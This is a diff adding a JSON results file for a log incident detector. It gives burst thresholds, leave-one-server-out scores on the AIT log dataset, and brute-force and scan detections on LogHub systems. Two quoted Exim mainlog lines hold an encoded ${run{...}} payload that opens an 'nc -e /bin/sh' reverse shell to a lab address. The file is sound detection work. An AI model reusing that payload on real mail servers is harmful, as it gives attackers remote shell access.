@@ -1,0 +1,177 @@
+{
+  "what": "burst thresholds of the whole-log incident detector (app/detectors/log_incidents.py)",
+  "thresholds": {
+    "brute_force": 5,
+    "web_scan": 15,
+    "probe": 5,
+    "enumeration": 5
+  },
+  "window_seconds": 600,
+  "method": "largest burst seen in normal traffic (AIT normal lines + real website logs) + 1, at least 5; leave-one-server-out test on AIT, LogHub (16 systems) as an outside test",
+  "normal_reference_bursts": {
+    "brute_force": 0,
+    "web_scan": 14,
+    "probe": 0,
+    "enumeration": 0
+  },
+  "ait_normal_bursts": {
+    "brute_force": 4,
+    "web_scan": 1,
+    "probe": 0,
+    "enumeration": 0
+  },
+  "data": "AIT Log Data Set V1.1 (Landauer et al., IEEE TR 2021; CC BY-NC-SA 4.0); test: LogHub 2k samples",
+  "results": {
+    "leave_one_server_out": {
+      "mail.cup.com": {
+        "thresholds": {
+          "brute_force": 5,
+          "web_scan": 15,
+          "probe": 5,
+          "enumeration": 5
+        },
+        "attack_steps_caught": {
+          "nikto": true,
+          "vrfy": true,
+          "hydra": true,
+          "upload": true,
+          "nmap": true
+        },
+        "incidents": 15,
+        "false_incidents": 1,
+        "false_incident_examples": [
+          {
+            "log": "mail.cup.com/exim4/mainlog",
+            "category": "webshell",
+            "source": "?",
+            "count": 1,
+            "example": "2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\\x2fbin\\x2fsh\\t-c\\t\\x22nc\\t-e\\t\\x2fbin\\x2fsh\\t192.168.10.238\\t9963\\x22}}@localhost: Too many \"Received\" headers - "
+          }
+        ]
+      },
+      "mail.insect.com": {
+        "thresholds": {
+          "brute_force": 5,
+          "web_scan": 15,
+          "probe": 5,
+          "enumeration": 5
+        },
+        "attack_steps_caught": {
+          "nikto": true,
+          "vrfy": true,
+          "hydra": true,
+          "upload": true,
+          "nmap": true
+        },
+        "incidents": 15,
+        "false_incidents": 0,
+        "false_incident_examples": []
+      },
+      "mail.onion.com": {
+        "thresholds": {
+          "brute_force": 5,
+          "web_scan": 15,
+          "probe": 5,
+          "enumeration": 5
+        },
+        "attack_steps_caught": {
+          "nikto": true,
+          "hydra": true,
+          "upload": true,
+          "nmap": true
+        },
+        "incidents": 14,
+        "false_incidents": 0,
+        "false_incident_examples": []
+      },
+      "mail.spiral.com": {
+        "thresholds": {
+          "brute_force": 5,
+          "web_scan": 15,
+          "probe": 5,
+          "enumeration": 5
+        },
+        "attack_steps_caught": {
+          "nikto": true,
+          "vrfy": true,
+          "hydra": true,
+          "upload": true,
+          "nmap": true
+        },
+        "incidents": 15,
+        "false_incidents": 1,
+        "false_incident_examples": [
+          {
+            "log": "mail.spiral.com/exim4/mainlog",
+            "category": "webshell",
+            "source": "?",
+            "count": 1,
+            "example": "2020-03-04 18:34:22 1j9Yqc-0002DQ-2e ** ${run{\\x2fbin\\x2fsh\\t-c\\t\\x22nc\\t-e\\t\\x2fbin\\x2fsh\\t192.168.10.81\\t9952\\x22}}@localhost: Too many \"Received\" headers - s"
+          }
+        ]
+      }
+    },
+    "attack_steps_caught_on_held_out_servers": {
+      "nikto": "4 of 4 servers",
+      "vrfy": "3 of 3 servers",
+      "hydra": "4 of 4 servers",
+      "upload": "4 of 4 servers",
+      "nmap": "4 of 4 servers"
+    },
+    "false_incidents_on_held_out_servers": 2,
+    "loghub_other_systems": {
+      "Android": [],
+      "Apache": [],
+      "BGL": [],
+      "HDFS": [],
+      "HPC": [],
+      "Hadoop": [],
+      "HealthApp": [],
+      "Linux": [
+        {
+          "incident": "Password brute-force attack",
+          "lines": 474,
+          "sources": [
+            "user root",
+            "150.183.249.110",
+            "local",
+            "207.243.167.114",
+            "60.30.224.116"
+          ]
+        }
+      ],
+      "Mac": [],
+      "OpenSSH": [
+        {
+          "incident": "Password brute-force attack",
+          "lines": 1079,
+          "sources": [
+            "183.62.140.253",
+            "187.141.143.180",
+            "103.99.0.122",
+            "112.95.230.3",
+            "5.188.10.180"
+          ]
+        },
+        {
+          "incident": "Service probing / port scan",
+          "lines": 6,
+          "sources": [
+            "123.235.32.19",
+            "195.154.37.122",
+            "5.188.10.180",
+            "103.207.39.212",
+            "185.190.58.151"
+          ]
+        }
+      ],
+      "OpenStack": [],
+      "Proxifier": [],
+      "Spark": [],
+      "Thunderbird": [],
+      "Windows": [],
+      "Zookeeper": []
+    }
+  },
+  "calibrated_at": "2026-10-26T08:24:05+00:00"
+}
